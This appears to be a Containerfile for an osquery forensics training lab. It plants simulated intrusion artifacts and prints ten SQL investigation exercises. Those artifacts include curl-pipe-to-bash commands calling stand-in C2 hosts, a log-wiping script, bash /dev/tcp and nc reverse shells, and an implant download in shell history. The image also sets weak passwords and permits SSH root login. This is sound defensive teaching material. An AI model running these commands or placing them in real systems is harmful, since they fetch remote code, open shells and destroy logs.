# Osquery - CTF Container
# Purpose: Arch Linux image with osquery, a planted set of forensic
#          artifacts, and ten investigation exercises to answer with SQL.
# Build:   podman build -f osquery.Containerfile -t osquery-ctf .
# Run:     podman run -it --rm osquery-ctf
# Login:   root:ctf, investigator:ctf, alice:password123, bob:password456

FROM docker.io/library/archlinux:latest

RUN pacman -Sy --noconfirm osquery openssh nginx sudo sqlite && \
    pacman -Scc --noconfirm && \
    rm -rf /var/cache/pacman/pkg/*

RUN ssh-keygen -A && \
    echo 'root:ctf' | chpasswd && \
    sed -i 's/#PermitRootLogin prohibit-password/PermitRootLogin yes/' /etc/ssh/sshd_config && \
    sed -i 's/#PasswordAuthentication yes/PasswordAuthentication yes/' /etc/ssh/sshd_config

RUN useradd -m -s /bin/bash investigator && \
    echo 'investigator:ctf' | chpasswd && \
    useradd -m -s /bin/bash alice && \
    echo 'alice:password123' | chpasswd && \
    useradd -m -s /bin/bash bob && \
    echo 'bob:password456' | chpasswd && \
    useradd -s /usr/bin/nologin daemon_svc

RUN echo '*/5 * * * * root /usr/bin/logger "scheduled health check"' > /etc/crontab && \
    echo '0 2 * * * alice /home/alice/cleanup.sh' >> /etc/crontab

COPY <<'HEREDOC' /etc/osquery/osquery.conf
{
  "options": {
    "config_plugin": "filesystem",
    "logger_plugin": "filesystem",
    "logger_path": "/var/log/osquery",
    "schedule_splay_percent": 10,
    "disable_audit": false,
    "audit_allow_config": true,
    "audit_allow_sockets": true
  }
}
HEREDOC

COPY <<'HEREDOC' /home/alice/.ssh/authorized_keys
ssh-rsa AAAAB3NzaC1yc2EAAAADAQABAAABAQ... alice@workstation
ssh-rsa AAAAB3NzaC1yc2EAAAADAQABAAABAQ... attacker_key
HEREDOC

RUN chown -R alice:alice /home/alice && \
    chmod 600 /home/alice/.ssh/authorized_keys

COPY <<'HEREDOC' /root/plant-forensic-artifacts.sh
#!/bin/bash
set -e

echo "[*] Planting forensic artifacts for osquery exercises..."

mkdir -p /var/www/html
echo '<?php echo "test"; ?>' > /var/www/html/index.php

# Plant a suspicious script in /tmp
cat > /tmp/suspicious-cleanup.sh << 'SCRIPT'
#!/bin/bash
curl -s http://malicious-c2.xyz/beacon | bash
for f in /var/log/*.log; do
    echo "" > "$f"
done
SCRIPT
chmod +x /tmp/suspicious-cleanup.sh

# Plant a setuid binary (simulated)
cp /usr/bin/id /tmp/setuid-test
chmod 4755 /tmp/setuid-test

# Plant a suspicious crontab entry for bob
echo '*/10 * * * * bob curl -s http://evil-c2.xyz/task | sh' > /var/spool/cron/bob
chown bob:bob /var/spool/cron/bob

# Plant a reverse shell entry in root's bash_history
echo "bash -i >& /dev/tcp/10.99.99.99/4444 0>&1" >> /root/.bash_history
echo "nc -e /bin/sh 10.99.99.99 4444" >> /root/.bash_history
echo "wget http://evil-c2.xyz/implant.sh -O /tmp/implant.sh" >> /root/.bash_history

# Plant evidence in alice's bash history
echo "cat /etc/shadow" >> /home/alice/.bash_history
echo "sudo su -" >> /home/alice/.bash_history

# Create a backdoor listening port (simulated via netcat in background)
timeout 5 nc -l -p 9999 &>/dev/null &
sleep 1

# Start some services
/usr/sbin/sshd -D &
sleep 1
/usr/bin/nginx &
sleep 1

echo "[*] Artifacts planted. Starting osquery exercises..."
echo ""
echo "=== OSQUERY INVESTIGATION EXERCISES ==="
echo ""
echo "1. Find listening network ports:"
echo "   osqueryi 'SELECT p.name, l.port, l.address FROM processes p JOIN listening_ports l ON p.pid = l.pid WHERE l.port > 0;'"
echo ""
echo "2. Find suspicious processes running from /tmp:"
echo "   osqueryi \"SELECT pid, name, cmdline, uid FROM processes WHERE cmdline LIKE '%/tmp/%';\""
echo ""
echo "3. Find setuid/setgid binaries:"
echo '   osqueryi "SELECT path, mode, uid FROM file WHERE path LIKE '\''/tmp/%'\'' AND mode LIKE '\''4%'\'';"'
echo ""
echo "4. Check crontab for persistence:"
echo "   osqueryi 'SELECT command, path FROM crontab;'"
echo ""
echo "5. Check shell history for suspicious commands:"
echo "   osqueryi \"SELECT uid, command, history_file FROM shell_history WHERE command LIKE '%nc %' OR command LIKE '%/dev/tcp%' OR command LIKE '%curl%evil%';\""
echo ""
echo "6. Find users with UID 0:"
echo "   osqueryi 'SELECT uid, username, shell FROM users WHERE uid = 0;'"
echo ""
echo "7. Find SSH authorized_keys files:"
echo "   osqueryi \"SELECT path, size FROM file WHERE path LIKE '%/.ssh/authorized_keys';\""
echo ""
echo "8. Check loaded kernel modules:"
echo "   osqueryi 'SELECT name, size FROM kernel_modules ORDER BY name;'"
echo ""
echo "9. Find recently modified files in /usr/bin:"
echo "   osqueryi \"SELECT path, mtime FROM file WHERE path LIKE '/usr/bin/%' ORDER BY mtime DESC LIMIT 10;\""
echo ""
echo "10. Comprehensive persistence sweep:"
echo "    osqueryi --json 'SELECT '\''cron'\'' AS source, command AS detail FROM crontab UNION ALL SELECT '\''ssh_key'\'', path FROM file WHERE path LIKE '\''%/.ssh/authorized_keys'\'' UNION ALL SELECT '\''setuid_tmp'\'', path FROM file WHERE path LIKE '\''/tmp/%'\'' AND mode LIKE '\''4%'\'';'"
echo ""
echo "Dropping to shell. Explore with osqueryi."
HEREDOC

RUN chmod +x /root/plant-forensic-artifacts.sh

WORKDIR /root
CMD ["/root/plant-forensic-artifacts.sh"]
